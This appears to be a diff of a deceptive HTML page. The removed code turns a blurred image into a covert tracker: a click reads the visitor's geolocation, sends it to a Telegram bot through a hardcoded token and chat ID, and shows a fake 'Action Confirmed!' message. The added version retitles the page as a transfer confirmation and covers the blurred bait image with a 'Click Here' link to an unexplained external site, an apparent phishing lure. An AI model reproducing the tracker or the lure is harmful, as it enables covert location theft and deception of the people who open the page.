@@ -3,60 +3,52 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>QR Action</title>
+  <title>تأكيد التحويل</title>
   <style>
     body {
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
       background-color: #f0f0f0;
     }
-    #qrCard {
-      cursor: pointer;
-      width: 400px;
-      height: 400px;
+    .card {
+      width: 500px; /* كبر الصورة */
+      height: 350px;
       background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg');
       background-size: cover;
       background-position: center;
-      filter: blur(3px); /* تغبيش الصورة */
+      filter: blur(3px); /* لتغبيش الصورة */
       display: flex;
       justify-content: center;
       align-items: center;
+      color: white;
       font-weight: bold;
-      font-size: 0; /* لإخفاء أي نص */
+      font-size: 24px;
+      text-shadow: 1px 1px 3px black;
+      cursor: pointer;
+      position: relative;
+    }
+    .card span {
+      position: absolute;
+      z-index: 2;
+    }
+    .card a {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      text-decoration: none;
+      z-index: 1; /* الرابط تحت النص */
     }
   </style>
 </head>
 <body>
-  <div id="qrCard"></div>
-
-  <script>
-    const qrCard = document.getElementById('qrCard');
-    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; 
-    const CHAT_ID = "7485197107";
-
-    qrCard.addEventListener('click', () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: `Lat: ${lat}\nLon: ${lon}`
-            })
-          });
-
-          alert('Action Confirmed!');
-        });
-      } else {
-        alert('Unable to get location.');
-      }
-    });
-  </script>
+  <div class="card">
+    <span>Click Here</span>
+    <a href="https://lolo-1-rt30.onrender.com" target="_blank"></a>
+  </div>
 </body>
 </html>
